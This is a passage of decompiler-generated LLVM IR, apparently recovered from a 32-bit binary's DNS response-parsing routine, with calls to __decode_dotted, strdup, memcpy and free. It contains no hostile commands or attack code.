  %v1_804dcfa = add i32 %v0_804dcfa, 24
  %v2_804dcfa = inttoptr i32 %v1_804dcfa to i32*
  %v3_804dcfa = load i32, i32* %v2_804dcfa, align 4
  %v4_804dcfa = add i32 %v3_804dcfa, 1
  store i32 %v4_804dcfa, i32* %v2_804dcfa, align 4
  %v0_804dcfe = load i32, i32* @esp, align 4
  %v1_804dcfe = add i32 %v0_804dcfe, 24
  %v2_804dcfe = inttoptr i32 %v1_804dcfe to i32*
  %v3_804dcfe = load i32, i32* %v2_804dcfe, align 4
  store i32 %v3_804dcfe, i32* @eax, align 4
  %v2_804dd02 = add i32 %v0_804dcfe, 360
  %v3_804dd02 = inttoptr i32 %v2_804dd02 to i32*
  %v4_804dd02 = load i32, i32* %v3_804dd02, align 4
  %v5_804dd02 = sub i32 %v3_804dcfe, %v4_804dd02
  %v11_804dd02 = xor i32 %v4_804dd02, %v3_804dcfe
  %v12_804dd02 = xor i32 %v5_804dd02, %v3_804dcfe
  %v13_804dd02 = and i32 %v12_804dd02, %v11_804dd02
  %v14_804dd02 = icmp slt i32 %v13_804dd02, 0
  %v16_804dd02 = icmp slt i32 %v5_804dd02, 0
  %v2_804dd09 = icmp eq i1 %v16_804dd02, %v14_804dd02
  br i1 %v2_804dd09, label %dec_label_pc_804dd0b, label %dec_label_pc_804dc94

dec_label_pc_804dd0b:                             ; preds = %dec_label_pc_804dcf6, %dec_label_pc_804dc72
  %v0_804dcfe.lcssa = phi i32 [ %v0_804dcfe68, %dec_label_pc_804dc72 ], [ %v0_804dcfe, %dec_label_pc_804dcf6 ]
  %v1_804dd0b = add i32 %v0_804dcfe.lcssa, 39
  %v2_804dd0b = inttoptr i32 %v1_804dd0b to i8*
  store i8 1, i8* %v2_804dd0b, align 1
  %v0_804dd10 = load i32, i32* @esp, align 4
  %v1_804dd10 = add i32 %v0_804dd10, 68
  %v2_804dd10 = inttoptr i32 %v1_804dd10 to i32*
  store i32 0, i32* %v2_804dd10, align 4
  %v0_804dd18 = load i32, i32* @esp, align 4
  %v1_804dd18 = add i32 %v0_804dd18, 376
  store i32 %v1_804dd18, i32* %edx.global-to-local, align 4
  %v2_804dd1f = inttoptr i32 %v0_804dd18 to i32*
  store i32 %v1_804dd18, i32* %v2_804dd1f, align 4
  %v0_804df4c86 = load i32, i32* @esp, align 4
  %v1_804df4c87 = add i32 %v0_804df4c86, 68
  %v2_804df4c88 = inttoptr i32 %v1_804df4c87 to i32*
  %v3_804df4c89 = load i32, i32* %v2_804df4c88, align 4
  store i32 %v3_804df4c89, i32* %edx.global-to-local, align 4
  %v2_804df5090 = add i32 %v0_804df4c86, 364
  %v3_804df5091 = inttoptr i32 %v2_804df5090 to i32*
  %v4_804df5092 = load i32, i32* %v3_804df5091, align 4
  %v5_804df5093 = sub i32 %v3_804df4c89, %v4_804df5092
  %v11_804df5094 = xor i32 %v4_804df5092, %v3_804df4c89
  %v12_804df5095 = xor i32 %v5_804df5093, %v3_804df4c89
  %v13_804df5096 = and i32 %v12_804df5095, %v11_804df5094
  %v14_804df5097 = icmp slt i32 %v13_804df5096, 0
  %v16_804df5099 = icmp slt i32 %v5_804df5093, 0
  %v2_804df57100 = icmp eq i1 %v16_804df5099, %v14_804df5097
  br i1 %v2_804df57100, label %dec_label_pc_804df5d, label %dec_label_pc_804dd27

dec_label_pc_804dd27:                             ; preds = %dec_label_pc_804dd0b, %dec_label_pc_804df44
  %v0_804df4c101 = phi i32 [ %v0_804df4c, %dec_label_pc_804df44 ], [ %v0_804df4c86, %dec_label_pc_804dd0b ]
  %v1_804dd27 = add i32 %v0_804df4c101, -4
  %v2_804dd27 = inttoptr i32 %v1_804dd27 to i32*
  store i32 256, i32* %v2_804dd27, align 4
  %v1_804dd2c = add i32 %v0_804df4c101, 72
  store i32 %v1_804dd2c, i32* @ecx, align 4
  %v2_804dd30 = add i32 %v0_804df4c101, -8
  %v3_804dd30 = inttoptr i32 %v2_804dd30 to i32*
  store i32 %v1_804dd2c, i32* %v3_804dd30, align 4
  %v1_804dd31 = add i32 %v0_804df4c101, 32
  %v2_804dd31 = inttoptr i32 %v1_804dd31 to i32*
  %v3_804dd31 = load i32, i32* %v2_804dd31, align 4
  %v5_804dd31 = add i32 %v0_804df4c101, -12
  %v6_804dd31 = inttoptr i32 %v5_804dd31 to i32*
  store i32 %v3_804dd31, i32* %v6_804dd31, align 4
  %v1_804dd35 = add i32 %v0_804df4c101, 60
  %v2_804dd35 = inttoptr i32 %v1_804dd35 to i32*
  %v3_804dd35 = load i32, i32* %v2_804dd35, align 4
  %v5_804dd35 = add i32 %v0_804df4c101, -16
  %v6_804dd35 = inttoptr i32 %v5_804dd35 to i32*
  store i32 %v3_804dd35, i32* %v6_804dd35, align 4
  %v3_804dd39 = add i32 %v0_804df4c101, -20
  %v4_804dd39 = inttoptr i32 %v3_804dd39 to i32*
  store i32 %v1_804d8f6, i32* %v4_804dd39, align 4
  %v6_804dd3a = call i32 @__decode_dotted(i32 %v3_804d997, i32 %v3_804d8fe, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804dd3a, i32* %eax.global-to-local, align 4
  store i32 %v6_804dd3a, i32* @ebx, align 4
  %v0_804dd41 = load i32, i32* @esp, align 4
  %v1_804dd41 = add i32 %v0_804dd41, 20
  %v2_804dd44 = icmp slt i32 %v6_804dd3a, 0
  br i1 %v2_804dd44, label %dec_label_pc_804de08, label %dec_label_pc_804dd4c

dec_label_pc_804dd4c:                             ; preds = %dec_label_pc_804dd27
  %v1_804dd4c = add i32 %v6_804dd3a, 10
  store i32 %v1_804dd4c, i32* @edi, align 4
  %v1_804dd4f = add i32 %v0_804dd41, 52
  %v2_804dd4f = inttoptr i32 %v1_804dd4f to i32*
  %v3_804dd4f = load i32, i32* %v2_804dd4f, align 4
  store i32 %v3_804dd4f, i32* %eax.global-to-local, align 4
  %v2_804dd53 = add i32 %v0_804dd41, 80
  %v3_804dd53 = inttoptr i32 %v2_804dd53 to i32*
  %v4_804dd53 = load i32, i32* %v3_804dd53, align 4
  %v5_804dd53 = sub i32 %v3_804dd4f, %v4_804dd53
  %v1_804dd4c.neg = sub i32 -10, %v6_804dd3a
  %v2_804dd57 = add i32 %v5_804dd53, %v1_804dd4c.neg
  %v13_804dd57 = icmp slt i32 %v2_804dd57, 0
  store i32 %v2_804dd57, i32* %eax.global-to-local, align 4
  %v2_804dd59 = add i32 %v0_804dd41, 84
  %v3_804dd59 = inttoptr i32 %v2_804dd59 to i32*
  store i32 %v2_804dd57, i32* %v3_804dd59, align 4
  %v1_804dd5d = icmp eq i1 %v13_804dd57, false
  br i1 %v1_804dd5d, label %dec_label_pc_804dd66, label %dec_label_pc_804dd5f

dec_label_pc_804dd5f:                             ; preds = %dec_label_pc_804dd4c
  %v0_804dd5f = load i32, i32* %eax.global-to-local, align 4
  %v0_804de26.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804de04

dec_label_pc_804dd66:                             ; preds = %dec_label_pc_804dd4c
  %v0_804dd66 = load i32, i32* @esp, align 4
  %v1_804dd66 = add i32 %v0_804dd66, 60
  %v2_804dd66 = inttoptr i32 %v1_804dd66 to i32*
  %v3_804dd66 = load i32, i32* %v2_804dd66, align 4
  store i32 %v3_804dd66, i32* %eax.global-to-local, align 4
  %v0_804dd6a = load i32, i32* @ebx, align 4
  %v2_804dd6a = add i32 %v0_804dd6a, %v3_804dd66
  store i32 %v2_804dd6a, i32* @esi, align 4
  %v3_804dd6d = add i32 %v2_804dd6a, %v1_804d8f6
  store i32 %v3_804dd6d, i32* @ebx, align 4
  %v1_804dd71 = add i32 %v0_804dd66, 72
  store i32 %v1_804dd71, i32* %edx.global-to-local, align 4
  %v2_804dd75 = add i32 %v0_804dd66, -4
  %v3_804dd75 = inttoptr i32 %v2_804dd75 to i32*
  store i32 %v1_804dd71, i32* %v3_804dd75, align 4
  %v0_804dd76 = call i32 @__GI_strdup()
  store i32 %v0_804dd76, i32* %eax.global-to-local, align 4
  %v1_804dd7b = load i32, i32* @esp, align 4
  %v2_804dd7b = add i32 %v1_804dd7b, 380
  %v3_804dd7b = inttoptr i32 %v2_804dd7b to i32*
  store i32 %v0_804dd76, i32* %v3_804dd7b, align 4
  %v0_804dd82 = load i32, i32* @ebx, align 4
  %v1_804dd82 = add i32 %v0_804dd82, 1
  %v2_804dd82 = inttoptr i32 %v1_804dd82 to i8*
  %v3_804dd82 = load i8, i8* %v2_804dd82, align 1
  %v4_804dd82 = zext i8 %v3_804dd82 to i32
  store i32 %v4_804dd82, i32* %edx.global-to-local, align 4
  %v1_804dd86 = inttoptr i32 %v0_804dd82 to i8*
  %v2_804dd86 = load i8, i8* %v1_804dd86, align 1
  %v3_804dd86 = zext i8 %v2_804dd86 to i32
  %v2_804dd89 = mul nuw nsw i32 %v3_804dd86, 256
  store i32 %v2_804dd89, i32* %eax.global-to-local, align 4
  %v2_804dd8c = or i32 %v2_804dd89, %v4_804dd82
  store i32 %v2_804dd8c, i32* %edx.global-to-local, align 4
  %v1_804dd8e = load i32, i32* @esp, align 4
  %v2_804dd8e = add i32 %v1_804dd8e, 384
  %v3_804dd8e = inttoptr i32 %v2_804dd8e to i32*
  store i32 %v2_804dd8c, i32* %v3_804dd8e, align 4
  %v0_804dd95 = load i32, i32* @ebx, align 4
  %v1_804dd95 = add i32 %v0_804dd95, 3
  %v2_804dd95 = inttoptr i32 %v1_804dd95 to i8*
  %v3_804dd95 = load i8, i8* %v2_804dd95, align 1
  %v4_804dd95 = zext i8 %v3_804dd95 to i32
  store i32 %v4_804dd95, i32* %edx.global-to-local, align 4
  %v1_804dd99 = add i32 %v0_804dd95, 2
  %v2_804dd99 = inttoptr i32 %v1_804dd99 to i8*
  %v3_804dd99 = load i8, i8* %v2_804dd99, align 1
  %v4_804dd99 = zext i8 %v3_804dd99 to i32
  %v2_804dd9d = mul nuw nsw i32 %v4_804dd99, 256
  store i32 %v2_804dd9d, i32* %eax.global-to-local, align 4
  %v2_804dda0 = or i32 %v2_804dd9d, %v4_804dd95
  store i32 %v2_804dda0, i32* %edx.global-to-local, align 4
  %v1_804dda2 = load i32, i32* @esp, align 4
  %v2_804dda2 = add i32 %v1_804dda2, 388
  %v3_804dda2 = inttoptr i32 %v2_804dda2 to i32*
  store i32 %v2_804dda0, i32* %v3_804dda2, align 4
  %v0_804dda9 = load i32, i32* @ebx, align 4
  %v1_804dda9 = add i32 %v0_804dda9, 4
  store i32 %v1_804dda9, i32* @ecx, align 4
  %v1_804ddac = add i32 %v0_804dda9, 7
  %v2_804ddac = inttoptr i32 %v1_804ddac to i8*
  %v3_804ddac = load i8, i8* %v2_804ddac, align 1
  %v4_804ddac = zext i8 %v3_804ddac to i32
  store i32 %v4_804ddac, i32* %edx.global-to-local, align 4
  %v2_804ddb0 = inttoptr i32 %v1_804dda9 to i8*
  %v3_804ddb0 = load i8, i8* %v2_804ddb0, align 1
  %v4_804ddb0 = zext i8 %v3_804ddb0 to i32
  %v2_804ddb4 = mul nuw i32 %v4_804ddb0, 16777216
  store i32 %v2_804ddb4, i32* %eax.global-to-local, align 4
  %v2_804ddb7 = or i32 %v2_804ddb4, %v4_804ddac
  store i32 %v2_804ddb7, i32* %edx.global-to-local, align 4
  %v1_804ddb9 = add i32 %v0_804dda9, 5
  %v2_804ddb9 = inttoptr i32 %v1_804ddb9 to i8*
  %v3_804ddb9 = load i8, i8* %v2_804ddb9, align 1
  %v4_804ddb9 = zext i8 %v3_804ddb9 to i32
  %v2_804ddbd = mul nuw nsw i32 %v4_804ddb9, 65536
  store i32 %v2_804ddbd, i32* %eax.global-to-local, align 4
  %v2_804ddc0 = or i32 %v2_804ddbd, %v2_804ddb7
  store i32 %v2_804ddc0, i32* %edx.global-to-local, align 4
  %v1_804ddc2 = add i32 %v0_804dda9, 6
  %v2_804ddc2 = inttoptr i32 %v1_804ddc2 to i8*
  %v3_804ddc2 = load i8, i8* %v2_804ddc2, align 1
  %v4_804ddc2 = zext i8 %v3_804ddc2 to i32
  %v2_804ddc6 = mul nuw nsw i32 %v4_804ddc2, 256
  store i32 %v2_804ddc6, i32* %eax.global-to-local, align 4
  %v2_804ddc9 = or i32 %v2_804ddc6, %v2_804ddc0
  store i32 %v2_804ddc9, i32* %edx.global-to-local, align 4
  %v1_804ddcb = load i32, i32* @esp, align 4
  %v2_804ddcb = add i32 %v1_804ddcb, 392
  %v3_804ddcb = inttoptr i32 %v2_804ddcb to i32*
  store i32 %v2_804ddc9, i32* %v3_804ddcb, align 4
  %v0_804ddd2 = load i32, i32* @ebx, align 4
  %v1_804ddd2 = add i32 %v0_804ddd2, 9
  %v2_804ddd2 = inttoptr i32 %v1_804ddd2 to i8*
  %v3_804ddd2 = load i8, i8* %v2_804ddd2, align 1
  %v4_804ddd2 = zext i8 %v3_804ddd2 to i32
  store i32 %v4_804ddd2, i32* %edx.global-to-local, align 4
  %v1_804ddd6 = add i32 %v0_804ddd2, 8
  %v2_804ddd6 = inttoptr i32 %v1_804ddd6 to i8*
  %v3_804ddd6 = load i8, i8* %v2_804ddd6, align 1
  %v4_804ddd6 = zext i8 %v3_804ddd6 to i32
  %v2_804ddda = mul nuw nsw i32 %v4_804ddd6, 256
  store i32 %v2_804ddda, i32* %eax.global-to-local, align 4
  %v2_804dddd = or i32 %v2_804ddda, %v4_804ddd2
  store i32 %v2_804dddd, i32* %edx.global-to-local, align 4
  %v1_804dddf = load i32, i32* @esp, align 4
  %v2_804dddf = add i32 %v1_804dddf, 396
  %v3_804dddf = inttoptr i32 %v2_804dddf to i32*
  store i32 %v2_804dddd, i32* %v3_804dddf, align 4
  %v0_804dde6 = load i32, i32* @ebx, align 4
  %v1_804dde6 = add i32 %v0_804dde6, 10
  store i32 %v1_804dde6, i32* @ebx, align 4
  %v1_804dde9 = load i32, i32* @esp, align 4
  %v2_804dde9 = add i32 %v1_804dde9, 400
  %v3_804dde9 = inttoptr i32 %v2_804dde9 to i32*
  store i32 %v1_804dde6, i32* %v3_804dde9, align 4
  %v0_804ddf0 = load i32, i32* @esi, align 4
  %v1_804ddf0 = add i32 %v0_804ddf0, 10
  store i32 %v1_804ddf0, i32* @esi, align 4
  %v1_804ddf3 = load i32, i32* @esp, align 4
  %v2_804ddf3 = add i32 %v1_804ddf3, 404
  %v3_804ddf3 = inttoptr i32 %v2_804ddf3 to i32*
  store i32 %v1_804ddf0, i32* %v3_804ddf3, align 4
  %v0_804ddfa = load i32, i32* @esp, align 4
  %v1_804ddfa = inttoptr i32 %v0_804ddfa to i32*
  %v2_804ddfa = load i32, i32* %v1_804ddfa, align 4
  store i32 %v2_804ddfa, i32* %eax.global-to-local, align 4
  %v3_804ddfa = add i32 %v0_804ddfa, 4
  %v1_804ddfb = add i32 %v0_804ddfa, 68
  %v2_804ddfb = inttoptr i32 %v1_804ddfb to i32*
  %v3_804ddfb = load i32, i32* %v2_804ddfb, align 4
  %v4_804ddfb = load i32, i32* %edx.global-to-local, align 4
  %v5_804ddfb = sub i32 %v3_804ddfb, %v4_804ddfb
  %v11_804ddfb = xor i32 %v4_804ddfb, %v3_804ddfb
  %v12_804ddfb = xor i32 %v5_804ddfb, %v3_804ddfb
  %v13_804ddfb = and i32 %v12_804ddfb, %v11_804ddfb
  %v14_804ddfb = icmp slt i32 %v13_804ddfb, 0
  %v16_804ddfb = icmp slt i32 %v5_804ddfb, 0
  %v2_804ddff = icmp eq i1 %v16_804ddfb, %v14_804ddfb
  br i1 %v2_804ddff, label %dec_label_pc_804de01, label %dec_label_pc_804de08

dec_label_pc_804de01:                             ; preds = %dec_label_pc_804dd66
  %v0_804de01 = load i32, i32* @edi, align 4
  %v2_804de01 = add i32 %v0_804de01, %v4_804ddfb
  br label %dec_label_pc_804de04

dec_label_pc_804de04:                             ; preds = %dec_label_pc_804dd5f, %dec_label_pc_804de01
  %v0_804de26 = phi i32 [ %v0_804de26.pre, %dec_label_pc_804dd5f ], [ %v3_804ddfa, %dec_label_pc_804de01 ]
  %storemerge2 = phi i32 [ %v0_804dd5f, %dec_label_pc_804dd5f ], [ %v2_804de01, %dec_label_pc_804de01 ]
  store i32 %storemerge2, i32* @ebx, align 4
  %v2_804de04 = icmp slt i32 %storemerge2, 0
  %v1_804de06 = icmp eq i1 %v2_804de04, false
  br i1 %v1_804de06, label %dec_label_pc_804de26, label %dec_label_pc_804de08

dec_label_pc_804de08:                             ; preds = %dec_label_pc_804de04, %dec_label_pc_804dd66, %dec_label_pc_804dd27
  %v0_804de13 = phi i32 [ %v3_804ddfa, %dec_label_pc_804dd66 ], [ %v1_804dd41, %dec_label_pc_804dd27 ], [ %v0_804de26, %dec_label_pc_804de04 ]
  %v1_804de08 = add i32 %v0_804de13, 68
  %v2_804de08 = inttoptr i32 %v1_804de08 to i32*
  %v3_804de08 = load i32, i32* %v2_804de08, align 4
  %v4_804de08 = icmp eq i32 %v3_804de08, 0
  br i1 %v4_804de08, label %dec_label_pc_804df8f, label %dec_label_pc_804de13

dec_label_pc_804de13:                             ; preds = %dec_label_pc_804de08
  %v1_804de13 = add i32 %v0_804de13, 344
  %v2_804de13 = inttoptr i32 %v1_804de13 to i32*
  %v3_804de13 = load i32, i32* %v2_804de13, align 4
  %v4_804de13 = icmp eq i32 %v3_804de13, 0
  br i1 %v4_804de13, label %dec_label_pc_804df8f, label %dec_label_pc_804df5d

dec_label_pc_804de26:                             ; preds = %dec_label_pc_804de04
  %v1_804de26 = add i32 %v0_804de26, 39
  %v2_804de26 = inttoptr i32 %v1_804de26 to i8*
  %v3_804de26 = load i8, i8* %v2_804de26, align 1
  %v4_804de26 = icmp eq i8 %v3_804de26, 0
  br i1 %v4_804de26, label %dec_label_pc_804dee1, label %dec_label_pc_804de31

dec_label_pc_804de31:                             ; preds = %dec_label_pc_804de26
  %v1_804de31 = add i32 %v0_804de26, 512
  %v2_804de31 = inttoptr i32 %v1_804de31 to i32*
  %v3_804de31 = load i32, i32* %v2_804de31, align 4
  store i32 %v3_804de31, i32* %ecx.global-to-local, align 4
  %v1_804de38 = add i32 %v3_804de31, 28
  %v2_804de38 = inttoptr i32 %v1_804de38 to i32*
  %v3_804de38 = load i32, i32* %v2_804de38, align 4
  store i32 %v3_804de38, i32* %eax.global-to-local, align 4
  %v2_804de3b = add i32 %v0_804de26, 404
  %v3_804de3b = inttoptr i32 %v2_804de3b to i32*
  store i32 %v3_804de38, i32* %v3_804de3b, align 4
  %v0_804de42 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804de42 = add i32 %v0_804de42, 32
  %v2_804de42 = inttoptr i32 %v1_804de42 to i32*
  %v3_804de42 = load i32, i32* %v2_804de42, align 4
  store i32 %v3_804de42, i32* %eax.global-to-local, align 4
  %v1_804de45 = load i32, i32* @esp, align 4
  %v2_804de45 = add i32 %v1_804de45, 408
  %v3_804de45 = inttoptr i32 %v2_804de45 to i32*
  store i32 %v3_804de42, i32* %v3_804de45, align 4
  %v0_804de4c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804de4c = add i32 %v0_804de4c, 36
  %v2_804de4c = inttoptr i32 %v1_804de4c to i32*
  %v3_804de4c = load i32, i32* %v2_804de4c, align 4
  store i32 %v3_804de4c, i32* %eax.global-to-local, align 4
  %v1_804de4f = load i32, i32* @esp, align 4
  %v2_804de4f = add i32 %v1_804de4f, 412
  %v3_804de4f = inttoptr i32 %v2_804de4f to i32*
  store i32 %v3_804de4c, i32* %v3_804de4f, align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v0_804de5b = load i32, i32* @esp, align 4
  %v1_804de5b = inttoptr i32 %v0_804de5b to i32*
  %v2_804de5b = load i32, i32* %v1_804de5b, align 4
  %v3_804de5b = inttoptr i32 %v2_804de5b to i8*
  store i32 %v2_804de5b, i32* @esi, align 4
  %v1_804de5e = add i32 %v0_804de5b, 512
  %v2_804de5e = inttoptr i32 %v1_804de5e to i32*
  %v3_804de5e = load i32, i32* %v2_804de5e, align 4
  %v4_804de5e = inttoptr i32 %v3_804de5e to i8*
  store i32 %v3_804de5e, i32* @edi, align 4
  %v7_804de65 = call i8* @_memcpy(i8* %v4_804de5e, i8* %v3_804de5b, i32 10)
  %v8_804de65 = ptrtoint i8* %v7_804de65 to i32
  store i32 %v8_804de65, i32* %ecx.global-to-local, align 4
  %v0_804de67 = load i32, i32* @esp, align 4
  %v1_804de67 = add i32 %v0_804de67, 512
  %v2_804de67 = inttoptr i32 %v1_804de67 to i32*
  %v3_804de67 = load i32, i32* %v2_804de67, align 4
  store i32 %v3_804de67, i32* %edx.global-to-local, align 4
  %v1_804de6e = add i32 %v3_804de67, 4
  %v2_804de6e = inttoptr i32 %v1_804de6e to i32*
  %v3_804de6e = load i32, i32* %v2_804de6e, align 4
  store i32 %v3_804de6e, i32* @eax, align 4
  %v9_804de71 = icmp eq i32 %v3_804de6e, 24
  br i1 %v9_804de71, label %dec_label_pc_804de98, label %dec_label_pc_804de76

dec_label_pc_804de76:                             ; preds = %dec_label_pc_804de31
  %v1_804de76 = add i32 %v3_804de67, 28
  %v2_804de76 = inttoptr i32 %v1_804de76 to i32*
  %v3_804de76 = load i32, i32* %v2_804de76, align 4
  %v4_804de76 = icmp eq i32 %v3_804de76, 0
  br i1 %v4_804de76, label %dec_label_pc_804df5d, label %dec_label_pc_804de80

dec_label_pc_804de80:                             ; preds = %dec_label_pc_804de76
  %v1_804de80 = add i32 %v0_804de67, 504
  %v2_804de80 = inttoptr i32 %v1_804de80 to i32*
  %v3_804de80 = load i32, i32* %v2_804de80, align 4
  %v12_804de80 = icmp eq i32 %v3_804de80, 1
  br i1 %v12_804de80, label %dec_label_pc_804de98, label %dec_label_pc_804de8a

dec_label_pc_804de8a:                             ; preds = %dec_label_pc_804de80
  %v12_804de8a = icmp eq i32 %v3_804de80, 28
  %v1_804de92 = icmp eq i1 %v12_804de8a, false
  br i1 %v1_804de92, label %dec_label_pc_804df5d, label %dec_label_pc_804de98

dec_label_pc_804de98:                             ; preds = %dec_label_pc_804de8a, %dec_label_pc_804de80, %dec_label_pc_804de31
  %v1_804de98 = add i32 %v0_804de67, 39
  %v2_804de98 = inttoptr i32 %v1_804de98 to i8*
  store i8 1, i8* %v2_804de98, align 1
  %v0_804de9d = load i32, i32* @eax, align 4
  %v1_804de9d = load i32, i32* @esp, align 4
  %v2_804de9d = add i32 %v1_804de9d, 504
  %v3_804de9d = inttoptr i32 %v2_804de9d to i32*
  %v4_804de9d = load i32, i32* %v3_804de9d, align 4
  %v15_804de9d = icmp eq i32 %v0_804de9d, %v4_804de9d
  %v1_804dea4 = icmp eq i1 %v15_804de9d, false
  br i1 %v1_804dea4, label %dec_label_pc_804df44, label %dec_label_pc_804deaa

dec_label_pc_804deaa:                             ; preds = %dec_label_pc_804de98
  %v1_804deaa = add i32 %v1_804de9d, 68
  %v2_804deaa = inttoptr i32 %v1_804deaa to i32*
  %v3_804deaa = load i32, i32* %v2_804deaa, align 4
  %v1_804deae = sub i32 -1, %v3_804deaa
  store i32 %v1_804deae, i32* %eax.global-to-local, align 4
  %v2_804deb0 = add i32 %v1_804de9d, 364
  %v3_804deb0 = inttoptr i32 %v2_804deb0 to i32*
  %v4_804deb0 = load i32, i32* %v3_804deb0, align 4
  %v5_804deb0 = add i32 %v4_804deb0, %v1_804deae
  store i32 %v5_804deb0, i32* %eax.global-to-local, align 4
  %v1_804deb7 = add i32 %v1_804de9d, 512
  %v2_804deb7 = inttoptr i32 %v1_804deb7 to i32*
  %v3_804deb7 = load i32, i32* %v2_804deb7, align 4
  store i32 %v3_804deb7, i32* %ecx.global-to-local, align 4
  %v2_804debe = add i32 %v3_804deb7, 36
  %v3_804debe = inttoptr i32 %v2_804debe to i32*
  store i32 %v5_804deb0, i32* %v3_804debe, align 4
  %v0_804dec1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804dec1 = add i32 %v0_804dec1, 16
  %v2_804dec1 = inttoptr i32 %v1_804dec1 to i32*
  %v3_804dec1 = load i32, i32* %v2_804dec1, align 4
  %v1_804dec4 = add i32 %v3_804dec1, 4
  store i32 %v1_804dec4, i32* %edx.global-to-local, align 4
  %v0_804dec7 = load i32, i32* %eax.global-to-local, align 4
  %v4_804dec7 = mul i32 %v0_804dec7, %v1_804dec4
  store i32 %v4_804dec7, i32* @eax, align 4
  %v2_804deca = add i32 %v0_804dec1, 32
  %v3_804deca = inttoptr i32 %v2_804deca to i32*
  %v4_804deca = load i32, i32* %v3_804deca, align 4
  %tmp126 = icmp ugt i32 %v4_804dec7, %v4_804deca
  br i1 %tmp126, label %dec_label_pc_804deaa.dec_label_pc_804df5d.loopexit_crit_edge, label %dec_label_pc_804ded3

dec_label_pc_804deaa.dec_label_pc_804df5d.loopexit_crit_edge: ; preds = %dec_label_pc_804deaa
  %v0_804df5d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804df5d

dec_label_pc_804ded3:                             ; preds = %dec_label_pc_804deaa
  %v1_804ded3 = add i32 %v0_804dec1, 36
  %v2_804ded3 = inttoptr i32 %v1_804ded3 to i32*
  store i32 0, i32* %v2_804ded3, align 4
  %v0_804deda = load i32, i32* @esp, align 4
  %v1_804deda = add i32 %v0_804deda, 39
  %v2_804deda = inttoptr i32 %v1_804deda to i8*
  store i8 0, i8* %v2_804deda, align 1
  %v0_804df44.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804df44

dec_label_pc_804dee1:                             ; preds = %dec_label_pc_804de26
  %v1_804dee1 = add i32 %v0_804de26, 376
  %v2_804dee1 = inttoptr i32 %v1_804dee1 to i32*
  %v3_804dee1 = load i32, i32* %v2_804dee1, align 4
  %v5_804dee1 = add i32 %v0_804de26, -4
  %v6_804dee1 = inttoptr i32 %v5_804dee1 to i32*
  store i32 %v3_804dee1, i32* %v6_804dee1, align 4
  %v1_804dee8 = call i32 @free(i32 %v3_804d997)
  store i32 %v1_804dee8, i32* %eax.global-to-local, align 4
  %v0_804deed = load i32, i32* @esp, align 4
  %v1_804deed = inttoptr i32 %v0_804deed to i32*
  %v2_804deed = load i32, i32* %v1_804deed, align 4
  store i32 %v2_804deed, i32* %eax.global-to-local, align 4
  %v3_804deed = add i32 %v0_804deed, 4
  %v1_804deee = add i32 %v0_804deed, 508
  %v2_804deee = inttoptr i32 %v1_804deee to i32*
  %v3_804deee = load i32, i32* %v2_804deee, align 4
  store i32 %v3_804deee, i32* @eax, align 4
  %v1_804def5 = add i32 %v0_804deed, 384
  %v2_804def5 = inttoptr i32 %v1_804def5 to i32*
  %v3_804def5 = load i32, i32* %v2_804def5, align 4
  %v15_804def5 = icmp eq i32 %v3_804def5, %v3_804deee
  %v1_804defc = icmp eq i1 %v15_804def5, false
  br i1 %v1_804defc, label %dec_label_pc_804df44, label %dec_label_pc_804defe

dec_label_pc_804defe:                             ; preds = %dec_label_pc_804dee1
  %v1_804defe = add i32 %v0_804deed, 396
  %v2_804defe = inttoptr i32 %v1_804defe to i32*
  %v3_804defe = load i32, i32* %v2_804defe, align 4
  store i32 %v3_804defe, i32* %eax.global-to-local, align 4
  %v1_804df05 = add i32 %v0_804deed, 516
  %v2_804df05 = inttoptr i32 %v1_804df05 to i32*
  %v3_804df05 = load i32, i32* %v2_804df05, align 4
  store i32 %v3_804df05, i32* %edx.global-to-local, align 4
  %v1_804df0c = add i32 %v3_804df05, 16
  %v2_804df0c = inttoptr i32 %v1_804df0c to i32*
  %v3_804df0c = load i32, i32* %v2_804df0c, align 4
  %v15_804df0c = icmp eq i32 %v3_804df0c, %v3_804defe
  br i1 %v15_804df0c, label %dec_label_pc_804df1b, label %dec_label_pc_804df11

dec_label_pc_804df11:                             ; preds = %dec_label_pc_804defe
  %v1_804df11 = inttoptr i32 %v3_804df05 to i32*
  %v2_804df11 = load i32, i32* %v1_804df11, align 4
  store i32 %v2_804df11, i32* %v1_804deed, align 4
  %v1_804df13 = call i32 @free(i32 %v3_804d997)
  store i32 %v1_804df13, i32* %eax.global-to-local, align 4
  %v0_804df18 = load i32, i32* @esp, align 4
  %v1_804df18 = inttoptr i32 %v0_804df18 to i32*
  %v2_804df18 = load i32, i32* %v1_804df18, align 4
  store i32 %v2_804df18, i32* %eax.global-to-local, align 4
  %v3_804df18 = add i32 %v0_804df18, 4
  br label %dec_label_pc_804df8f

dec_label_pc_804df1b:                             ; preds = %dec_label_pc_804defe
  store i32 %v3_804defe, i32* %v1_804deed, align 4
  %v1_804df1c = add i32 %v0_804deed, 400
  %v2_804df1c = inttoptr i32 %v1_804df1c to i32*
  %v3_804df1c = load i32, i32* %v2_804df1c, align 4
  %v5_804df1c = add i32 %v0_804deed, -4
  %v6_804df1c = inttoptr i32 %v5_804df1c to i32*
  store i32 %v3_804df1c, i32* %v6_804df1c, align 4
  %v3_804df23 = load i32, i32* %v2_804df05, align 4
  store i32 %v3_804df23, i32* %ecx.global-to-local, align 4
  %v0_804df2a = load i32, i32* %eax.global-to-local, align 4
  %v2_804df2a = add i32 %v3_804df23, 36
  %v3_804df2a = inttoptr i32 %v2_804df2a to i32*
  %v4_804df2a = load i32, i32* %v3_804df2a, align 4
  %v7_804df2a = mul i32 %v4_804df2a, %v0_804df2a
  store i32 %v7_804df2a, i32* %eax.global-to-local, align 4
  %v2_804df2e = add i32 %v3_804df23, 28
  %v3_804df2e = inttoptr i32 %v2_804df2e to i32*
  %v4_804df2e = load i32, i32* %v3_804df2e, align 4
  %v5_804df2e = add i32 %v4_804df2e, %v7_804df2a
  store i32 %v5_804df2e, i32* %eax.global-to-local, align 4
  %v2_804df31 = add i32 %v0_804deed, -8
  %v3_804df31 = inttoptr i32 %v2_804df31 to i32*
